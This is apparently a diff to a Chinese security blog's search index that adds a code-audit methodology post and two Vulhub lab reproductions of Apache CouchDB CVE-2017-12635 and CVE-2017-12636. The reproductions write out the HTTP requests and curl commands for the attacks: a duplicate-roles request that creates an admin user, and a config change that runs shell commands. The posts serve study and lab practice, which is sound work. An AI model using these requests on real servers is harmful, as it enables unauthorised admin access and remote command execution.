@@ -17,6 +17,362 @@
       </tags>
   </entry>
   <entry>
+    <title>代码审计方法论</title>
+    <url>/2021/07/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA/</url>
+    <content><![CDATA[<h2 id="代码审计方法论"><a href="#代码审计方法论" class="headerlink" title="代码审计方法论"></a>代码审计方法论</h2><a id="more"></a>
+
+<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a><strong>1、介绍</strong></h2><p>代码审计(CodeAudit) 就是根据了解到的程序功能和关键业务，针对程序源代码逐条进行检查和分析，找出源代码中可能引发的常见安全漏洞和业务逻辑问题的缺陷，并提供代码修改建议或解决方案。</p>
+<p>针对于源代码审计工作环境的部署，其实如果是以服务的方式为客户的代码进行审计，审计的环境一般都会相对复杂，会面临几种情况： </p>
+<ol>
+<li>最理想的环境，客户提供代码同时有对应的测试环境，这样的话就可以黑盒+白盒进行审计，可以提高审计的效率和覆盖度。</li>
+<li>只提供项目源代码，需要自己梳理整个项目源码的架构，通读所有关键代码，相对时间成本比较大，但是可以彻底了解整个项目源代码并且挖掘出高质量漏洞。</li>
+<li>只提供源代码片段，这种情况首先需要跟客户沟通是否可以提供完整项目源代码，否则是在一定程度影响源代码审计的完整性，因为部分功能代码片段可能会找不到调用的接口函数，无法追踪业务逻辑代码。</li>
+</ol>
+<p>所以客户的代码审计服务基本上没有搭建环境的情况，因为他们不会提供数据库，想跑也跑不起来。</p>
+<h2 id="2、源代码审计前期准备"><a href="#2、源代码审计前期准备" class="headerlink" title="2、源代码审计前期准备"></a>2、源代码审计前期准备</h2><ol>
+<li>需要和客户确认最新源代码版本</li>
+<li>需要客户准备入场后代码审计环境，是我们自备电脑审计还是在客户专用的电脑上做审计</li>
+<li>如果是专用的电脑，需要在电脑上安装office或者wps、代码编辑器及IDE工具，同时部署代码审计工具</li>
+<li>需要提供被审计系统相关需求文档及设计文档，帮助审计人员了解业务，可以深入业务进行审计</li>
+<li>需要跟开发团队提前打好招呼，为审计人员讲解代码结构，可以方便审计人员迅速进入审计工作中</li>
+</ol>
+<p><strong>常用源代码审计相关工具如下</strong></p>
+<h3 id="2-1-自动化工具"><a href="#2-1-自动化工具" class="headerlink" title="2.1 自动化工具"></a>2.1 自动化工具</h3><p>Fortify、CheckMarx、Sonarqube</p>
+<h3 id="2-2-辅助工具"><a href="#2-2-辅助工具" class="headerlink" title="2.2 辅助工具"></a>2.2 辅助工具</h3><p>Sublime text、Notepad++、EclipseIDE、JetBrain(CLion、IDEA、PyCharm、GoLang、PhpStorm…)</p>
+<h2 id="3、审计流程"><a href="#3、审计流程" class="headerlink" title="3、审计流程"></a><strong>3、审计流程</strong></h2><p><img src="https://image.3001.net/images/20210708/1625755871425.png" alt="image-20210708222505722"></p>
+<h2 id="4、人工审计思路"><a href="#4、人工审计思路" class="headerlink" title="4、人工审计思路"></a><strong>4、人工审计思路</strong></h2><h3 id="4-1-正向数据流分析法-根据业务推代码"><a href="#4-1-正向数据流分析法-根据业务推代码" class="headerlink" title="4.1 正向数据流分析法-根据业务推代码"></a><strong>4.1 正向数据流分析法-根据业务推代码</strong></h3><p><strong>描述</strong></p>
+<p>寻找敏感功能点，通读功能点代码；<br>正向审计即从功能入口点进行跟踪，一直到数据流处理结束；</p>
+<p><strong>优点</strong></p>
+<p>精准定向挖掘，利用程度高；对程序有整体把握，能较全面的覆盖各种不同类的功能点，能挖掘到有价值的逻辑漏洞，有助于高质量的交付。</p>
+<p><strong>缺点</strong></p>
+<p>命名不规范的代码容易被忽略，导致失去先机；<br>慢，易迷失在海量代码之间；<br>难，绕不过去的框架问题。</p>
+<p><strong>针对性漏洞</strong></p>
+<p>登录，找回密码，文件上传，任意文件下载，验证码漏洞，流程绕过，越权等无明显特征等漏洞。</p>
+<p><strong>数据流分析流程图</strong></p>
+<p><img src="https://image.3001.net/images/20210708/16257558746870.png" alt="image-20210708222549720"></p>
+<h4 id="常见的不可信数据入口方法"><a href="#常见的不可信数据入口方法" class="headerlink" title="常见的不可信数据入口方法"></a><strong>常见的不可信数据入口方法</strong></h4><p><em>JAVA</em></p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>getParameter</td>
+<td>request类获取参数方法</td>
+</tr>
+<tr>
+<td>getParameterNames</td>
+<td>获取参数名</td>
+</tr>
+<tr>
+<td>getParameterValues</td>
+<td>获取参数值</td>
+</tr>
+<tr>
+<td>getParameterMap</td>
+<td>获取参数map类型</td>
+</tr>
+<tr>
+<td>getQueryString</td>
+<td>获取URL的value值</td>
+</tr>
+<tr>
+<td>getHeader</td>
+<td>获取http请求头</td>
+</tr>
+<tr>
+<td>getHeaderNames</td>
+<td>获取请求头名</td>
+</tr>
+<tr>
+<td>getRequestURI</td>
+<td>获取请求URL</td>
+</tr>
+<tr>
+<td>getCookies</td>
+<td>获取cookie</td>
+</tr>
+<tr>
+<td>getRequestedSessionId</td>
+<td>获取sessionid</td>
+</tr>
+<tr>
+<td>getInputStream</td>
+<td>获取输入数据</td>
+</tr>
+<tr>
+<td>getReader</td>
+<td>获取请求内容</td>
+</tr>
+<tr>
+<td>getMethod</td>
+<td>获取请求方法</td>
+</tr>
+<tr>
+<td>getProtocol</td>
+<td>获取请求协议</td>
+</tr>
+<tr>
+<td>getServerName</td>
+<td>获取服务名</td>
+</tr>
+<tr>
+<td>getRemoteUser</td>
+<td>获取当前缓存的用户</td>
+</tr>
+<tr>
+<td>getUserPrincipal</td>
+<td>获取用户指纹</td>
+</tr>
+</tbody></table>
+<p><em>PHP</em></p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$_GET</td>
+<td>GET方法请求参数获取</td>
+</tr>
+<tr>
+<td>$_POST</td>
+<td>POST方法请求参数获取</td>
+</tr>
+<tr>
+<td>$_COOKIE</td>
+<td>获取请求中cookie</td>
+</tr>
+<tr>
+<td>$_REQUEST</td>
+<td>$_REQUEST可以获取以POST、GET方法提交的数据</td>
+</tr>
+<tr>
+<td>$_FILES</td>
+<td>POST方法上传文件</td>
+</tr>
+<tr>
+<td>$_SERVER[‘REQUEST_METHOD’]</td>
+<td>访问页面时的请求方法</td>
+</tr>
+<tr>
+<td>$_SERVER[‘QUERY_STRING’]</td>
+<td>查询(query)的字符串</td>
+</tr>
+<tr>
+<td>$_SERVER[‘HTTP_ACCEPT’]</td>
+<td>当前请求的Accept:头部的内容</td>
+</tr>
+<tr>
+<td>$_SERVER[‘HTTP_HOST’]</td>
+<td>当前请求的HOST:头部的内容</td>
+</tr>
+<tr>
+<td>$_SERVER[‘HTTP_REFERER’]</td>
+<td>当前请求的HOST:头部的内容</td>
+</tr>
+<tr>
+<td>$_SERVER[‘HTTP_USER_AGENT’]</td>
+<td>当前请求的HOST:头部的内容</td>
+</tr>
+</tbody></table>
+<h4 id="常见的不可信文件访问方法"><a href="#常见的不可信文件访问方法" class="headerlink" title="常见的不可信文件访问方法"></a><strong>常见的不可信文件访问方法</strong></h4><p><em>JAVA</em></p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>java.io.FileInputStream</td>
+<td>文件输入</td>
+</tr>
+<tr>
+<td>java.io.FileOutputStream</td>
+<td>文件输出</td>
+</tr>
+<tr>
+<td>java.io.FileReader</td>
+<td>文件读取</td>
+</tr>
+<tr>
+<td>java.io.FileWriter</td>
+<td>文件写入</td>
+</tr>
+</tbody></table>
+<p><em>PHP</em></p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file_get_contents</td>
+<td>文件输入</td>
+</tr>
+<tr>
+<td>file_put_contents</td>
+<td>文件输出</td>
+</tr>
+<tr>
+<td>fread</td>
+<td>文件读取</td>
+</tr>
+<tr>
+<td>fwrite</td>
+<td>文件输出</td>
+</tr>
+</tbody></table>
+<h3 id="4-2-逆向数据流分析法-根据缺陷推业务"><a href="#4-2-逆向数据流分析法-根据缺陷推业务" class="headerlink" title="4.2 逆向数据流分析法-根据缺陷推业务"></a><strong>4.2 逆向数据流分析法-根据缺陷推业务</strong></h3><p><strong>描述</strong></p>
+<p>根据敏感关键字回溯参数传递过程；<br>逆向审计即先根据一些关键词搜索，定位到可能存在风险的关键词/函数，再反推到功能入口，看整个处理过程是否存在漏洞。</p>
+<p><strong>优点</strong></p>
+<p>针对性强，通过搜索敏感关键字可快速定位可能存在的漏洞，可快速、高效、定向的挖掘高质量的漏洞。</p>
+<p><strong>缺点</strong></p>
+<p>对程序整体了解不够深入，在漏洞定位时比较耗时，覆盖面不够全面，对逻辑漏洞往往覆盖不到。</p>
+<p><strong>针对漏洞</strong></p>
+<p>SQL注入，命令注入，反序列化等特征明显的漏洞。</p>
+<p>针对常规漏洞（指纹识别度高）：如SQLi、CMDi、线程安全等<br>Ibatis、Mybatis：使用xml做SQL映射，搜索$、${、+可以定位<br>Hibernate：代码中的HQL，搜索字符串拼接的关键字Concat、append、+等</p>
+<p><strong>数据流分析流程图</strong></p>
+<p><img src="https://image.3001.net/images/20210708/16257558812248.png" alt="image-20210708222647520"></p>
+<p><strong>危险函数/关键字</strong></p>
+<table>
+<thead>
+<tr>
+<th>漏洞</th>
+<th>方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SQL</td>
+<td>Statement,  PreparedStatement,sql,$,hql</td>
+</tr>
+<tr>
+<td>XXE</td>
+<td>SAXReader,DocumentBuilder,XMLStreamReader</td>
+</tr>
+<tr>
+<td>FILE</td>
+<td>MultipartFile,createNewFile,FileInputStream</td>
+</tr>
+<tr>
+<td>SSRF</td>
+<td>HttpCilent,URL,ImageIO,HttpURLConnection,OkHttpCilent</td>
+</tr>
+<tr>
+<td>EXEC</td>
+<td>getRuntime.exec,processBuilder.start</td>
+</tr>
+</tbody></table>
+<h3 id="4-3-总结"><a href="#4-3-总结" class="headerlink" title="4.3 总结"></a><strong>4.3 总结</strong></h3><p><strong>正向数据流分析法</strong></p>
+<p>优点：快速开展，快速定位，有效挖掘严重漏洞。<br>缺陷：可能遗漏某些隐藏接口/url</p>
+<p><strong>逆向数据流分析法</strong></p>
+<p>优点：较为全面的对所有接口/url进行跟踪审计<br>缺点：比较耗时，审计到可能无法有效利用的漏洞</p>
+<p><strong>建议优先关注的漏洞类型</strong></p>
+<p>命令执行 &gt; 代码执行 &gt; 文件操作(上传/包含/下载) &gt; SQL注入 &gt; 逻辑漏洞&gt; SSRF &gt; XSS&gt;CSRF&gt;XXE&gt;反序列化</p>
+<hr>
+<p>参考链接：</p>
+<p><a href="https://www.yuque.com/haibei-a8jfo/vsoi0z/efynxz" target="_blank" rel="noopener">https://www.yuque.com/haibei-a8jfo/vsoi0z/efynxz</a></p>
+<p><a href="https://www.cnblogs.com/afanti/p/13156152.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/13156152.html</a></p>
+<p><a href="https://mp.weixin.qq.com/s/DfgAdzpyZCRIZTsfzE8A4A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/DfgAdzpyZCRIZTsfzE8A4A</a></p>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Couchdb 任意命令执行 (CVE-2017-12636)</title>
+    <url>/2021/05/20/Couchdb%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%20(CVE-2017-12636)/</url>
+    <content><![CDATA[<h1 id="Apache-Couchdb-任意命令执行-CVE-2017-12636"><a href="#Apache-Couchdb-任意命令执行-CVE-2017-12636" class="headerlink" title="Apache Couchdb 任意命令执行 (CVE-2017-12636)"></a>Apache Couchdb 任意命令执行 (CVE-2017-12636)</h1><p>Apache CouchDB 是一个开源的面向文档的 NoSQL 数据库，用 Erlang 实现。CouchDB 使用多种格式和协议来存储、传输和处理其数据。它使用 JSON 来存储数据，使用 MapReduce 作为其查询语言的 JavaScript，以及作为 API 的 HTTP。</p>
+<p>CouchDB 管理用户可以通过 HTTP(S) 配置数据库服务器。一些配置选项包括随后由 CouchDB 启动的操作系统级二进制文件的路径。这允许 1.7.0 之前的 Apache CouchDB 和 2.1.1 之前的 2.x 中的管理员用户作为 CouchDB 用户执行任意 shell 命令，包括从公共互联网下载和执行脚本。</p>
+<p>结合CVE-2017-12635和 CVE-2017-12636 以获得未经身份验证的远程命令执行。</p>
+<a id="more"></a>
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>CVE-2017-12636是认证后RCE，所以如果不知道目标管理员密码，可以先使用<code>CVE-2017-12635</code>添加管理员用户。Couchdb 2.x 和 1.x 的 API 接口有所不同，因此该漏洞的利用方式不同。</p>
+<h3 id="在-1-x-下利用"><a href="#在-1-x-下利用" class="headerlink" title="在 1.x 下利用"></a>在 1.x 下利用</h3><p>依次执行以下请求，触发任意命令执行。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39; -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;: &quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br><span class="line">curl -X POST &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;vultest&#x2F;_temp_view?limit&#x3D;10&#39; -d &#39;&#123;&quot;language&quot;: &quot;cmd&quot;, &quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type: application&#x2F;json&#39;</span><br></pre></td></tr></table></figure>
+
+<p>在这里，<code>vulhub:vulhub</code>是管理员帐户和密码。</p>
+<p>第一个请求是添加一个带有 name和 value的<strong>query_servers</strong>，这是我们稍后要执行的命令。<code>cmd``&quot;id &gt;/tmp/success&quot;</code></p>
+<p><img src="https://image.3001.net/images/20210702/16252251819024.png" alt="image-20210702152415688"></p>
+<p>第二个和第三个请求是添加数据库和文档，这里添加后才能查询。</p>
+<p><img src="https://image.3001.net/images/20210702/16252251829734.png" alt="image-20210702152555774"></p>
+<p>第四个请求是在这个Database做一个查询，使用我在第一步添加的一个名为<strong>query_servers的</strong><code>cmd</code>，最后触发命令执行。</p>
+<p><img src="https://image.3001.net/images/20210702/1625225186602.png" alt="image-20210702152700444"></p>
+<p>可以看到success文件生成，证明利用成功</p>
+<p><img src="https://image.3001.net/images/20210702/1625225189352.png" alt="image-20210702153011827"></p>
+<h3 id="在-2-x-下利用"><a href="#在-2-x-下利用" class="headerlink" title="在 2.x 下利用"></a>在 2.x 下利用</h3><p>Couchdb 2.x 引入了集群，浏览器<code>/_membership</code>获取节点列表。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;_membership</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210702/16252252021646.png" alt="image-20210702154715987"></p>
+<p>只有一个节点，名称为<code>nonode@nohost</code>，然后修改node的配置<code>nonode@nohost</code>如下。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;_node&#x2F;nonode@nohost&#x2F;_config&#x2F;query_servers&#x2F;cmd -d &#39;&quot;id &gt;&#x2F;tmp&#x2F;success&quot;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210702/16252251994376.png" alt="image-20210702155029361"></p>
+<p>然后，以与 1.6.0 漏洞相同的方式：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;: &quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>Couchdb 2.x 已移除<code>_temp_view</code>，因此我们需要添加一个<code>_view</code>以触发 中定义的命令<code>query_servers</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -X PUT http:&#x2F;&#x2F;vulhub:vulhub@192.168.44.132:5984&#x2F;vultest&#x2F;_design&#x2F;vul -d &#39;&#123;&quot;_id&quot;:&quot;_design&#x2F;test&quot;, &quot;views&quot;:&#123;&quot;woyun&quot;:&#123;&quot;map&quot;:&quot;&quot;&#125; &#125;,&quot; language&quot;: &quot;cmd&quot;&#125;&#39; -H &quot;Content-Type: application&#x2F;json&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后<code>query_servers</code>将执行输入的命令。</p>
+<h2 id="POC-脚本"><a href="#POC-脚本" class="headerlink" title="POC 脚本"></a>POC 脚本</h2><p>一个简单的POC <a href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py" target="_blank" rel="noopener">exp.py</a>，将脚本里面的target和command修改为你的test target，然后将版本修改为对应的Couchdb版本（1或2），成功得到反向shell。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache Couchdb</tag>
+        <tag>CVE-2017-12636</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Couchdb 远程权限提升 (CVE-2017-12635)</title>
+    <url>/2021/05/19/Apache%20Couchdb%20%E8%BF%9C%E7%A8%8B%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%20(CVE-2017-12635)/</url>
+    <content><![CDATA[<h1 id="Apache-Couchdb-远程权限提升-CVE-2017-12635"><a href="#Apache-Couchdb-远程权限提升-CVE-2017-12635" class="headerlink" title="Apache Couchdb 远程权限提升 (CVE-2017-12635)"></a>Apache Couchdb 远程权限提升 (CVE-2017-12635)</h1><p>Apache CouchDB 是一个开源的面向文档的 NoSQL 数据库，用 Erlang 实现。CouchDB 使用多种格式和协议来存储、传输和处理其数据。它使用 JSON 来存储数据，使用 MapReduce 作为其查询语言的 JavaScript，以及作为 API 的 HTTP。</p>
+<p>由于基于 Erlang 的 JSON 解析器和基于 JavaScript 的 JSON 解析器的差异，在 1.7.0 之前的 Apache CouchDB 和 2.1.1 之前的 2.x 中可以提交<code>_users</code>带有重复键的文档，<code>roles</code>用于数据库内的访问控制，包括特殊情况<code>_admin</code>角色，表示管理用户。</p>
+<a id="more"></a>
+
+<p>参考链接。</p>
+<ul>
+<li><a href="https://justi.cz/security/2017/11/14/couchdb-rce-npm.html" target="_blank" rel="noopener">https://justi.cz/security/2017/11/14/couchdb-rce-npm.html</a></li>
+<li><a href="https://www.exploit-db.com/exploits/44498" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44498</a></li>
+<li><a href="http://bobao.360.cn/learning/detail/4716.html" target="_blank" rel="noopener">http://bobao.360.cn/learning/detail/4716.html</a></li>
+</ul>
+<p>环境启动后，浏览<code>http://192.168.44.132:5984/_utils/</code>到一个网页，说明Couchdb已经启动成功。但是没有身份验证，您什么也做不了。</p>
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>这是添加用户的正常请求。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:5984</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>返回了 403 错误：<code>{&quot;error&quot;: &quot;forbidden&quot;, &quot;reason&quot;: &quot;Only _admin may set roles&quot;}</code>，这意味着只有管理员可以使用端点。</p>
+<p><img src="https://image.3001.net/images/20210702/16251991056980.png" alt="image-20210702120637358"></p>
+<p>通过发送包含重复<strong>roles</strong>的请求来绕过限制。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;_users&#x2F;org.couchdb.user:vulhub HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:5984</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 108</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;user&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;vulhub&quot;,</span><br><span class="line">  &quot;roles&quot;: [&quot;_admin&quot;],</span><br><span class="line">  &quot;roles&quot;: [],</span><br><span class="line">  &quot;password&quot;: &quot;vulhub&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功创建了一个用户<code>vulhub</code>，有密码<code>vulhub</code>。</p>
+<p><img src="https://image.3001.net/images/20210702/16251991083767.png" alt="image-20210702120819383"></p>
+<p>登录成功。</p>
+<p><img src="https://image.3001.net/images/20210702/16251991293917.png" alt="image-20210702120939566"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache Couchdb</tag>
+        <tag>CVE-2017-12635</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>WebShell客户端流量特征</title>
     <url>/2021/05/18/Webshell%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/</url>
     <content><![CDATA[<h1 id="WebShell客户端流量特征"><a href="#WebShell客户端流量特征" class="headerlink" title="WebShell客户端流量特征"></a>WebShell客户端流量特征</h1><p>WebShell客户端是一种用于服务器上WebShell后门与攻击客户端之间进行通信的程序，通常可以根据WebShell客户端的流量来判断服务器上是否存在WebShell后门。</p>
@@ -376,8 +732,13 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\joker0xxx3&gt;python3 -V</span><br><span class="line">Python 3.8.5</span><br><span class="line"></span><br><span class="line">C:\Users\joker0xxx3&gt;python2 -V</span><br><span class="line">Python 2.7.18</span><br></pre></td></tr></table></figure>
 
 <h2 id="配置pip"><a href="#配置pip" class="headerlink" title="配置pip"></a>配置pip</h2><p> Python 安装包需要用到包管理工具pip，但是当同时安装python2和python3的时候，pip只是其中一个版本，以下将提供一个修改方式，即重新安装两个版本的pip，使得两个python版本的pip能够共存。</p>
-<p>在DOS命令框输入命令，python3 -m pip install –upgrade pip –force-reinstall，显示重新安装成功。</p>
-<p>python2同理也可以：python2 -m pip install –upgrade pip –force-reinstall</p>
+<p>在DOS命令框输入命令，</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure>
+
+<p>显示重新安装成功。</p>
+<p>python2同理也可以：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 -m pip install --upgrade pip --force-reinstall</span><br></pre></td></tr></table></figure>
+
 <p>现在可以通过pip2 -V 和 pip3-V 查看两个版本的pip信息，以后只需运行pip2install XXX和pip3 install XXX即可安装各自的python包</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\joker0xxx3&gt;pip2 -V</span><br><span class="line">pip 20.3.4 from d:\python\python2\lib\site-packages\pip (python 2.7)</span><br><span class="line"></span><br><span class="line">C:\Users\joker0xxx3&gt;pip3 -V</span><br><span class="line">pip 20.2.3 from d:\python\python3\lib\site-packages\pip (python 3.8)</span><br></pre></td></tr></table></figure>
 
